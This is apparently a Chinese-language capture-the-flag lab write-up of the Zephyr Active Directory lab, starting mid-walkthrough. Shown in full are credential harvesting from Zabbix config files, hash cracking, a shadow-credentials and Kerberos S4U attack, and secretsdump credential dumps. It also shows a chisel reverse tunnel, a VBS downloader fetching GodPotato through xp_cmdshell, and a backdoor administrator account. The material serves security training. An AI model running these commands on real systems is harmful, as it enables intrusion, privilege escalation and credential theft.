LISTEN    0         4096                  [::]:10051               [::]:*        users:(("zabbix_server",pid=1269,fd=5),("zabbix_server",pid=1268,fd=5),("zabbix_server",pid=1267,fd=5),("zabbix_server",pid=1266,fd=5),("zabbix_server",pid=1265,fd=5),("zabbix_server",pid=1264,fd=5),("zabbix_server",pid=1263,fd=5),("zabbix_server",pid=1262,fd=5),("zabbix_server",pid=1261,fd=5),("zabbix_server",pid=1260,fd=5),("zabbix_server",pid=1259,fd=5),("zabbix_server",pid=1258,fd=5),("zabbix_server",pid=1257,fd=5),("zabbix_server",pid=1256,fd=5),("zabbix_server",pid=1245,fd=5),("zabbix_server",pid=1244,fd=5),("zabbix_server",pid=1243,fd=5),("zabbix_server",pid=1242,fd=5),("zabbix_server",pid=1241,fd=5),("zabbix_server",pid=1240,fd=5),("zabbix_server",pid=1239,fd=5),("zabbix_server",pid=1238,fd=5),("zabbix_server",pid=1237,fd=5),("zabbix_server",pid=1236,fd=5),("zabbix_server",pid=1235,fd=5),("zabbix_server",pid=1234,fd=5),("zabbix_server",pid=1233,fd=5),("zabbix_server",pid=1232,fd=5),("zabbix_server",pid=1231,fd=5),("zabbix_server",pid=1230,fd=5),("zabbix_server",pid=1229,fd=5),("zabbix_server",pid=1228,fd=5),("zabbix_server",pid=1227,fd=5),("zabbix_server",pid=1226,fd=5),("zabbix_server",pid=1225,fd=5),("zabbix_server",pid=1224,fd=5),("zabbix_server",pid=1223,fd=5),("zabbix_server",pid=1222,fd=5),("zabbix_server",pid=1221,fd=5),("zabbix_server",pid=1220,fd=5),("zabbix_server",pid=1219,fd=5),("zabbix_server",pid=1218,fd=5),("zabbix_server",pid=1217,fd=5),("zabbix_server",pid=868,fd=5))
LISTEN    0         128                   [::]:22                  [::]:*        users:(("sshd",pid=834,fd=4)) 
```

从 `ss -tlnp` 输出可以看到这台 zephyr 服务器上运行的关键服务：

- **443 (nginx)** → Zabbix Web 前端
- **10050 / 10051** → Zabbix agent 和 server
- **3306 (MySQL) 监听在 127.0.0.1** → 只允许本地连接
- **22 (SSH)** → 远程管理
- **多个 Python3 进程监听在高位端口（14517-14519, 15517-15519, 14330）** → 很可能是 Zabbix 相关的代理或 API 服务

```
root@zephyr:/# find / -name "zabbix_server.conf" 2>/dev/null
find / -name "zabbix_server.conf" 2>/dev/null
/usr/local/etc/zabbix_server.conf
root@zephyr:/# cat /usr/local/etc/zabbix_server.conf | grep -i -E '^DBPassword|^DBUser|^DBName|^DBHost'
< | grep -i -E '^DBPassword|^DBUser|^DBName|^DBHost'
DBName=zabbix
DBUser=zabbix
DBPassword=rDhHbBEfh35sMbkY
root@zephyr:/# 

```

找到数据库账号密码

进入数据库

```
mysql -u zabbix -p'rDhHbBEfh35sMbkY' zabbix
```

查询用户账号密码

```
mysql> SELECT userid,username,passwd FROM users;
SELECT userid,username,passwd FROM users;
+--------+----------+--------------------------------------------------------------+
| userid | username | passwd                                                       |
+--------+----------+--------------------------------------------------------------+
|      1 | Admin    | $2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q |
|      2 | guest    | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
|      5 | marcus   | $2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4. |
+--------+----------+--------------------------------------------------------------+
3 rows in set (0.01 sec)
```

hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O -w 3

爆破出凭据

账号marcus

密码 !QAZ2wsx

```
                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# 

nxc smb 192.168.210.10 -u marcus -p '!QAZ2wsx' -d zsm.local          
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\marcus:!QAZ2wsx 
                                                                                              
```

```
bloodhound-python -d zsm.local -u marcus -p '!QAZ2wsx' -dc zph-svrdc01.zsm.local -c All --zip -ns 192.168.210.10 --dns-tcp

```

bloodhound分析

![image-20260716101218100](/images/htb-prolab/zephyr/20260716101218278.png)

**AddKeyCredentialLink** 是影子凭证攻击，也就是 ZPH-SVRMGMT1

在zephyr上查这个机器的ip

```
mysql -u zabbix -p'rDhHbBEfh35sMbkY' -D zabbix -e "SELECT h.hostid, h.host, i.ip FROM hosts h JOIN interface i ON h.hostid = i.hostid WHERE h.host='ZPH-SVRMGMT1';"
```

![image-20260716102425802](/images/htb-prolab/zephyr/20260721172134679.png)

#### 重新挂代理

```
kali： ./chisel server -p 443 --reverse

210.13机子: nohup ./chisel client 10.10.16.47:443 R:192.168.89.128:9998:socks &

```

影子攻击

使用pywhisker工具操作用户属性

```
proxychains4 python3 pywhisker.py -d "zsm.local" -u "marcus" -p '!QAZ2wsx' --target "ZPH-SVRMGMT1$" --action "list"
```

![image-20260717195901696](/images/htb-prolab/zephyr/20260721172123189.png)

```
proxychains4 bloodyad -d zsm.local -u marcus -p '!QAZ2wsx' -H 192.168.210.10 get object "CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local" --resolve-sd
```

查看acl权限

| 属性                 | 值                                           |
| -------------------- | -------------------------------------------- |
| `sAMAccountName`     | ZPH-SVRMGMT1$                                |
| `objectSid`          | S-1-5-21-2734290894-461713716-141835440-4101 |
| `operatingSystem`    | Windows Server 2022 Standard                 |
| `userAccountControl` | WORKSTATION_TRUST_ACCOUNT                    |
| `lastLogon`          | 2026-07-17 12:00:57                          |
| `logonCount`         | 383                                          |

### ZEPHYR-MGMT(.11)

查看对机器权限

```
proxychains4 bloodyad -d zsm.local -u marcus -p '!QAZ2wsx' -H 192.168.210.10 get object "CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local" --resolve-sd | grep -A5 "marcus"
```

![image-20260717201210795](/images/htb-prolab/zephyr/20260721172111690.png)

| ACE   | 权限                      | 对象类型                      |
| ----- | ------------------------- | ----------------------------- |
| ACE.0 | CONTROL_ACCESS            | Allowed-To-Authenticate       |
| ACE.1 | **WRITE_PROP\|READ_PROP** | **ms-DS-Key-Credential-Link** |

**marcus 拥有对 `msDS-KeyCredentialLink` 的写入权限，攻击条件具备！**

```
proxychains4 python3 pywhisker.py -d zsm.local -u marcus -p '!QAZ2wsx' --target "ZPH-SVRMGMT1$" --dc-ip 192.168.210.10 --action add -v
```

**为域内的计算机账号 `ZPH-SVRMGMT1$` 添加影子凭据**生成证书

![image-20260721172101411](/images/htb-prolab/zephyr/20260721172101712.png)

影子攻击成功！`msDS-KeyCredentialLink` 已写入，证书文件已生成：

- **PFX 文件：** `cgil9NWp.pfx`
- **密码：** `IOd0QJLOfl7WnXXjnjCB`

下一步获取TGT

```
proxychains /usr/bin/python3 PKINITtools/gettgtpkinit.py -cert-pfx cgil9NWp.pfx -pfx-pass 'IOd0QJLOfl7WnXXjnjCB' zsm.local/'ZPH-SVRMGMT1$' cgil9NWp.ccache
```

![image-20260717202825168](/images/htb-prolab/zephyr/20260717202825377.png)

TGT 获取成功！

**关键信息：**

- AS-REP Key: `d2a44cf37eedcd96b44ac2099cc91a7b4cf9bd9252423c74d97faf05720348a7`
- CCache 文件: `cgil9NWp.ccache`

获取NTLMhash

```
export KRB5CCNAME=$(pwd)/cgil9NWp.ccache
proxychains4 /usr/bin/python3 PKINITtools/getnthash.py -key d2a44cf37eedcd96b44ac2099cc91a7b4cf9bd9252423c74d97faf05720348a7 -dc-ip 192.168.210.10 'zsm.local/ZPH-SVRMGMT1$'
```

![image-20260717202959448](/images/htb-prolab/zephyr/20260717202959663.png)

```
89d0b56874f61ad38bad336a77b8ef2f
```

`ZPH-SVRMGMT1$` 有 `Allowed-To-Authenticate` 权限（之前 ACL 中 ACE.0）

 S4U2Self 模拟域管获取服务票据：

```
──(root㉿kali)-[~/桌面/pywhisker-main/pywhisker]
└─# proxychains4 /usr/bin/python3 PKINITtools/gets4uticket.py 'kerberos+ccache://zsm.local\ZPH-SVRMGMT1$:cgil9NWp.ccache@192.168.210.10' 'cifs/ZPH-SVRMGMT1.zsm.local@ZSM.LOCAL' 'administrator@zsm.local' 'administrator.ccache'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  192.168.116.128:9998  ...  192.168.210.10:88  ...  OK

```



```
(root㉿kali)-[~/桌面/pywhisker-main/pywhisker]
└─# proxychains4 impacket-atexec -k -no-pass 'zsm.local/administrator@ZPH-SVRMGMT1.zsm.local' 'whoami'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[proxychains] Dynamic chain  ...  192.168.116.128:9998  ...  192.168.210.11:445  ...  OK
[*] Creating task \sYwjhRxz
[*] Running task \sYwjhRxz
[*] Deleting task \sYwjhRxz
[*] Attempting to read ADMIN$\Temp\sYwjhRxz.tmp
nt authority\system

```

以 `NT AUTHORITY\SYSTEM` 最高权限在目标机器 `ZPH-SVRMGMT1.zsm.local` 执行了 `whoami`。

`nt authority\system` 是 Windows 本地系统最高权限，等同于机器账户 `ZPH-SVRMGMT1$` 权限

现在用管理员票据攻击域控

```
export KRB5CCNAME=$(pwd)/administrator@cifs_ZPH-SVRMGMT1.zsm.local@ZSM.LOCAL.ccache
proxychains4 impacket-secretsdump -k -no-pass 'zsm.local/administrator@ZPH-SVRMGMT1.zsm.local'
```

通过本地票据，以目标服务器最高权限远程抓取服务器全部账号凭证

```
root㉿kali)-[~/桌面/pywhisker-main/pywhisker]
└─# export KRB5CCNAME=$(pwd)/administrator.ccache
proxychains4 impacket-secretsdump -k -no-pass 'zsm.local/administrator@ZPH-SVRMGMT1.zsm.local'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  192.168.116.128:9998  ...  192.168.210.11:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x90c9f7848607977407f9afabdb3cfcc0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:545c503123664e5713439e088bd91035:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:68a58eed2cff6a92dd8d2d5b9116be4f:::
[*] Dumping cached domain logon information (domain/username:hash)
ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6: (2026-06-03 16:27:26+00:00)
ZSM.LOCAL/marcus:$DCC2$10240#marcus#66dddfc25df0d824e30c55a9ecccb512: (2026-07-17 02:10:00+00:00)
ZSM.LOCAL/jamie:$DCC2$10240#jamie#8eaa1e87b84f7197df2b836fae8e5c3c: (2022-10-28 12:56:42+00:00)

[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ZSM\ZPH-SVRMGMT1$:plain_password_hex:a59ff2202125f08774455a23ac8e623130743053e98d29eea3234cf4995bc3040b3e86e68c4ce7d681da4614f3b4d6066ce96a1a0257a1dca1221f864fcaf05f617d53ff9e6e7e8afedf8e4e70dd793440a6203fc780bbae017e795f3002958340850257b1caff49bcb045a861c67631dfb7f0ac6525ec72a9fd35035bfa1cb79578a785c08140a10abe5b756c2bcaa06ae1dceb3fe0f315a793c66aeaf35558deafd3d3796674de82fb98ba41878356fdde5ab8fc89dfe8a67c34015d64f03f52d515684b07c1bc9108daa73c6a63f49bf32e6403f850ae7d56ca6f2c49ca82fe414f14c100a2fb7cc901a2f07c52dc
ZSM\ZPH-SVRMGMT1$:aad3b435b51404eeaad3b435b51404ee:89d0b56874f61ad38bad336a77b8ef2f:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x05341d094f374bb97fd82b3a19619bbc3d28e967
dpapi_userkey:0xc4de07634653cdeda95b1baea5a86ceaa9683003
[*] NL$KM 
 0000   95 E8 38 F2 47 8A 41 12  A5 77 CA 0A 23 E6 56 28   ..8.G.A..w..#.V(
 0010   85 56 73 10 A9 49 99 6A  B5 5D FB C5 AD B4 4C 76   .Vs..I.j.]....Lv
 0020   3A 07 D8 40 73 ED EE 03  28 5E A6 02 7E 09 38 EA   :..@s...(^..~.8.
 0030   48 55 7F 6D 9C FD 9A 8B  C1 F1 F4 D7 0A 6F 3B D0   HU.m.........o;.
NL$KM:95e838f2478a4112a577ca0a23e6562885567310a949996ab55dfbc5adb44c763a07d84073edee03285ea6027e0938ea48557f6d9cfd9a8bc1f1f4d70a6f3bd0
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

```
proxychains4 impacket-atexec -k -no-pass 'zsm.local/administrator@ZPH-SVRMGMT1.zsm.local' 'cmd /c "type C:\Users\Administrator\Desktop\flag.txt"'
```

先获取这个机子的flag

```
ZEPHYR{K3y_Cr3d3n714l_l1nk_d4ng3r}
```

进入交互式shell

```
export KRB5CCNAME=$(pwd)/administrator.ccache
proxychains4 impacket-psexec -k -no-pass 'zsm.local/administrator@ZPH-SVRMGMT1.zsm.local'
```

![image-20260717210520837](/images/htb-prolab/zephyr/20260721172042308.png)

使用nxc对两个mssql进行枚举

```
                                                                                                                                                                                                                                        
┌──(root㉿kali)-[~/桌面/impacket-0.13.0/examples]
└─# # 用 nxc 扫描两台 SQL 服务器的 SMB
proxychains4 nxc smb 192.168.210.15 192.168.210.19 -u marcus -p '!QAZ2wsx' -d zsm.local
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Dynamic chain  ...  192.168.229.128:9998 [proxychains] Dynamic chain  ...  192.168.229.128:9998  ...  192.168.210.19:445  ...  192.168.Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--<--socket error or timeout!
SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:True) (SMBv1:None)
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--<--socket error or timeout!
SMB         192.168.210.15  445    ZPH-SVRSQL01     [+] zsm.local\marcus:!QAZ2wsx 
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

用marcus登录sql01

```
proxychains4 impacket-mssqlclient -windows-auth 'zsm.local/marcus:!QAZ2wsx@192.168.210.15'

```

```
-- 1. 检查当前身份和权限
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

```

发现用户权限太低

在11这个机子上

```
REM 查看域信息
net group "Domain Admins" /domain
net user /domain

REM 查看本地管理员组
net localgroup Administrators

REM ARP 和网络连接
arp -a
route print

```

![image-20260719114859511](/images/htb-prolab/zephyr/20260721172025421.png)

发现了jamie这个用户

在bloodhound上查询

![image-20260719114948994](/images/htb-prolab/zephyr/20260721172013683.png)

有forcechangepassword

更改jamie的密码将marcus加入到GENERAL MANAGEMENT@ZSM.LOCAL在强制修改jamie

```

C:\Windows\system32> net group "General Management" /domain
The request will be processed at a domain controller for domain zsm.local.

Group name     General Management
Comment        Users in this group are general managers of ZSM

Members

-------------------------------------------------------------------------------
jamie                    
The command completed successfully.


C:\Windows\system32> net group "General Management" marcus /add /domain
The request will be processed at a domain controller for domain zsm.local.

The command completed successfully.


C:\Windows\system32> 

```

```
──(root㉿kali)-[~/桌面/pywhisker-main/pywhisker]
└─# proxychains4 bloodyad -d zsm.local -u marcus -p '!QAZ2wsx' -H 192.168.210.10 set password 'jamie' 'Test@123456' --stealth
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  192.168.229.128:9998  ...  192.168.210.10:389  ...  OK
[+] Password changed successfully!

```

![image-20260719132231051](/images/htb-prolab/zephyr/20260721172003912.png)

nxc枚举

```
proxychains4 nxc smb 192.168.210.11 -u jamie -p 'Test@123456' -d zsm.local
```

12可以登录但不是admin

```
proxychains4 -q evil-winrm -i 192.168.210.12 -u 'jamie@zsm.local' -p 'Test@123456' -P 5985

```

### ZEPHYR-SQL01(.15)

这里卡了很久，在.11机子上发现了jamie和sql也就是.15这个机子有关联登陆上去发现还是普通用户

在.11上读到了zabbix的数据库密码

```
cat /var/www/html/conf/zabbix.conf.php
<?php
// Zabbix GUI configuration file.

$DB['TYPE']                             = 'MYSQL';
$DB['SERVER']                   = 'localhost';
$DB['PORT']                             = '0';
$DB['DATABASE']                 = 'zabbix';
$DB['USER']                             = 'zabbix';
$DB['PASSWORD']                 = 'rDhHbBEfh35sMbkY';

// Schema name. Used for PostgreSQL.
$DB['SCHEMA']                   = '';

// Used for TLS connection.
$DB['ENCRYPTION']               = false;
$DB['KEY_FILE']                 = '';
$DB['CERT_FILE']                = '';
$DB['CA_FILE']                  = '';
$DB['VERIFY_HOST']              = false;
$DB['CIPHER_LIST']              = '';

// Vault configuration. Used if database credentials are stored in Vault secrets manager.
$DB['VAULT_URL']                = '';
$DB['VAULT_DB_PATH']    = '';
$DB['VAULT_TOKEN']              = '';

// Use IEEE754 compatible value range for 64-bit Numeric (float) history values.
// This option is enabled by default for new Zabbix installations.
// For upgraded installations, please read database upgrade notes before enabling this option.
$DB['DOUBLE_IEEE754']   = true;

$ZBX_SERVER                             = 'localhost';
$ZBX_SERVER_PORT                = '10051';
$ZBX_SERVER_NAME                = '';

$IMAGE_FORMAT_DEFAULT   = IMAGE_FORMAT_PNG;

// Uncomment this block only if you are using Elasticsearch.
// Elasticsearch url (can be string if same url is used for all types).
//$HISTORY['url'] = [
//      'uint' => 'http://localhost:9200',
//      'text' => 'http://localhost:9200'
//];
// Value types stored in Elasticsearch.
//$HISTORY['types'] = ['uint', 'text'];

// Used for SAML authentication.
// Uncomment to override the default paths to SP private key, SP and IdP X.509 certificates, and to set extra settings.
$SSO['SP_KEY']                  = 'conf/certs/sp.key';
$SSO['SP_CERT']                 = 'conf/certs/sp.crt';
$SSO['IDP_CERT']                = 'conf/certs/idp.cer';
//$SSO['SETTINGS']              = [];
root@zephyr:/# 

```

登录.15

```
proxychains4 impacket-mssqlclient 'zsm.local/zabbix:rDhHbBEfh35sMbkY@192.168.210.15'
```

![image-20260721171952678](/images/htb-prolab/zephyr/20260721171952944.png)

zabbix 是 **sysadmin**！开启 xp_cmdshell 拿 SYSTEM shell：

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 验证
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';
```

![image-20260721171942641](/images/htb-prolab/zephyr/20260721171942897.png)

```
NULL                                                               
SQL (zabbix  dbo@master)> EXEC xp_cmdshell 'whoami /priv';
output                                                                           
-------------------------------------------------------------------------------- 
NULL                                                                             
PRIVILEGES INFORMATION                                                           
----------------------                                                           
NULL                                                                             
Privilege Name                Description                               State    
============================= ========================================= ======== 
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled 
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled  
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  
SeCreateGlobalPrivilege       Create global objects                     Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
NULL                                                                             
SQL (zabbix  dbo@master)> 

```

拥有 **`SeImpersonatePrivilege`（已启用）**令牌模拟 patato提权

```
curl -L -o /tmp/GodPotato-NET4.exe http://10.10.16.47/GodPotato-NET4.exe
cp /tmp/GodPotato-NET4.exe /tmp/gp.exe
EXEC xp_cmdshell 'echo Set x=CreateObject("MSXML2.XMLHTTP"):x.open "GET", "http://192.168.210.13/gp.exe",0:x.send:Set s=CreateObject("ADODB.Stream"):s.Type=1:s.Open:s.Write x.responseBody:s.SaveToFile "C:\Users\Public\gp.exe",2 > C:\Users\Public\dl.vbs & cscript //nologo C:\Users\Public\dl.vbs';
EXEC xp_cmdshell 'dir C:\Users\Public\gp.exe';
```

```
command completed successfully.                                                        
NULL                                                                                       
NULL                                                                                       
SQL (zabbix  dbo@master)> -- 1. 先验证 GodPotato 到底跑了什么用户
SQL (zabbix  dbo@master)> EXEC xp_cmdshell 'C:\Users\Public\gp.exe -cmd "cmd /c whoami > C:\Users\Public\who.txt 2>&1"';
output                                                                                 
-------------------------------------------------------------------------------------- 
[*] CombaseModule: 0x140728713216000                                                   
[*] DispatchTable: 0x140728715526352                                                   
[*] UseProtseqFunction: 0x140728714899136                                              
[*] UseProtseqFunctionParamCount: 6                                                    
[*] HookRPC                                                                            
[*] Start PipeServer                                                                   
[*] Trigger RPCSS                                                                      
[*] CreateNamedPipe \\.\pipe\dd25d239-f9dc-4aef-921c-b08821c0006c\pipe\epmapper        
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                                
[*] DCOM obj IPID: 0000c002-0bb4-ffff-bd88-14709df82570                                
[*] DCOM obj OXID: 0xee0dcb883546b983                                                  
[*] DCOM obj OID: 0x3bc6f2bef35a5f97                                                   
[*] DCOM obj Flags: 0x281                                                              
[*] DCOM obj PublicRefs: 0x0                                                           
[*] Marshal Object bytes len: 100                                                      
[*] UnMarshal Object                                                                   
[*] Pipe Connected!                                                                    
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                          
[*] CurrentsImpersonationLevel: Impersonation                                          
[*] Start Search System Token                                                          
[*] PID : 892 Token:0x912  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation 
[*] Find System Token : True                                                           
[*] UnmarshalObject: 0x80070776                                                        
[*] CurrentUser: NT AUTHORITY\SYSTEM                                                   
[*] process start with pid 3832                                                        
NULL                                                                                   
SQL (zabbix  dbo@master)> EXEC xp_cmdshell 'type C:\Users\Public\who.txt';
output              
------------------- 
nt authority\system 
NULL                
SQL (zabbix  dbo@master)> 
SQL (zabbix  dbo@master)> -- 2. 用写批处理的方式
SQL (zabbix  dbo@master)> EXEC xp_cmdshell 'echo net user backdoor P@ss123! /add > C:\Users\Public\p.bat & echo net localgroup Administrators backdoor /add >> C:\Users\Public\p.bat';
output 
------ 
NULL   
SQL (zabbix  dbo@master)> EXEC xp_cmdshell 'C:\Users\Public\gp.exe -cmd "C:\Windows\System32\cmd.exe /c C:\Users\Public\p.bat"';
output                                                                                 
-------------------------------------------------------------------------------------- 
[*] CombaseModule: 0x140728713216000                                                   
[*] DispatchTable: 0x140728715526352                                                   
[*] UseProtseqFunction: 0x140728714899136                                              
[*] UseProtseqFunctionParamCount: 6                                                    
[*] HookRPC                                                                            
[*] Start PipeServer                                                                   
[*] Trigger RPCSS                                                                      
[*] CreateNamedPipe \\.\pipe\d978c76b-29a2-49ee-94d3-baa2fab44dfd\pipe\epmapper        
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                                
[*] DCOM obj IPID: 00004c02-0de8-ffff-0970-67424e47942c                                
[*] DCOM obj OXID: 0xeef7faf485875763                                                  
[*] DCOM obj OID: 0x3def523f2b9a50a0                                                   
[*] DCOM obj Flags: 0x281                                                              
[*] DCOM obj PublicRefs: 0x0                                                           
[*] Marshal Object bytes len: 100                                                      
[*] UnMarshal Object                                                                   
[*] Pipe Connected!                                                                    
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                          
[*] CurrentsImpersonationLevel: Impersonation                                          
[*] Start Search System Token                                                          
[*] PID : 892 Token:0x912  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation 
[*] Find System Token : True                                                           
[*] UnmarshalObject: 0x80070776                                                        
[*] CurrentUser: NT AUTHORITY\SYSTEM                                                   
[*] process start with pid 3272                                                        
NULL                                                                                   
C:\Windows\system32>net user backdoor P@ss123! /add                                    
The account already exists.                                                            
NULL                                                                                   
More help is available by typing NET HELPMSG 2224.                                     
NULL                                                                                   
NULL                                                                                   
C:\Windows\system32>net localgroup Administrators backdoor /add                        
The command completed successfully.                                                    
NULL                                                                                   
NULL                                                                                   
SQL (zabbix  dbo@master)> EXEC xp_cmdshell 'net localgroup Administrators';
```

```
proxychains4 impacket-psexec './backdoor:P@ss123!@192.168.210.15'
```

![image-20260719160301762](/images/htb-prolab/zephyr/20260721171930495.png)

```
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is B0D9-C779

 Directory of C:\Users\Administrator\Desktop

21/10/2022  15:59    <DIR>          .
21/10/2022  15:59    <DIR>          ..
21/10/2022  15:59                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)   5,872,349,184 bytes free

C:\Users\Administrator\Desktop> type flag.txt
ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}
C:\Users\Administrator\Desktop> 

```

接着进行信息收集



```
REM === ARP表（发现内网主机） ===
arp -a

REM === 域信息 ===
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

REM === 域控和信任 ===
nltest /dclist:zsm.local
nltest /dclist:internal.zsm.local
nltest /domain_trusts

REM === 查看 SMB 会话（谁连入了.15） ===
net session
net share

REM === DNS 缓存（可能泄露其他主机名到IP映射） ===
ipconfig /displaydns

REM === 导出 SAM/LSA 凭据（用 GodPotato） ===
C:\Users\Public\gp.exe -cmd "cmd /c reg save HKLM\SAM C:\Users\Public\sam.save & reg save HKLM\SECURITY C:\Users\Public\sec.save"

REM === hosts 文件 ===
type C:\Windows\System32\drivers\etc\hosts

REM === 关键：mssql 连接历史（可能存 zabbix_hosts 数据库凭据） ===
sqlcmd -Q "SELECT * FROM zabbix_hosts.dbo.users" 2>nul
```



dump出hash

```
─(root㉿kali)-[~]
└─# proxychains4 impacket-secretsdump './backdoor:P@ss123!@192.168.210.15'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  192.168.229.128:9998  ...  192.168.210.15:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4d59fba7e66ea9e9bbbf401f0dac8944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ac325190bb999ef4ad73b0b67e8e33c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
backdoor:1001:aad3b435b51404eeaad3b435b51404ee:5af33376fb21c57a84f3066e7cfbdecc:::
[*] Dumping cached domain logon information (domain/username:hash)
ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6: (2026-06-03 16:29:19+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ZSM\ZPH-SVRSQL01$:aes256-cts-hmac-sha1-96:f6fe8d901e4090893beeb9423fa67c74b2defc181c3cfefb96437926af186ac8
ZSM\ZPH-SVRSQL01$:aes128-cts-hmac-sha1-96:d7c1a0e61eb480a75d0d8078fae84ec3
ZSM\ZPH-SVRSQL01$:des-cbc-md5:e36ba779ba070492
